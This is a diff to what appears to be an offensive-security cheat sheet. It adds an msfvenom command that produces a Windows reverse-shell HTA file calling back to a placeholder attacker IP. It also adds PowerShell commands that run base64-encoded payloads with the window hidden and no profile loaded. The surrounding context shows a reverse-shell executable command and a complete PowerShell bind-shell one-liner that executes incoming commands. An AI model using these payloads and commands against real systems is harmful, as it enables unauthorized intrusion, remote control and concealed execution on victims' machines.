@@ -1350,6 +1350,9 @@ msfvenom --list payloads
 
 # create Windows TCP reverse shell exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
+
+# create Windows TCP reverse shell hta
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f hta-psh -o shell.hta
 ```
 
 
@@ -1871,6 +1874,15 @@ $listener.Stop();
 
 # bind shell one-liner
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (IEx $data 2>&1 |Out-String);$prompt = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($prompt);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush();}$client.Close();$listener.Stop()"
+
+# run base64-encoded command
+powershell -e base64_payload_here
+
+# run base64-encoded command without popping window
+powershell -e base64_payload_here -w hidden
+
+# run base64-encoded command without popping window or loading user profile
+powershell -e base64_payload_here -w hidden -nop
 ```
 
 
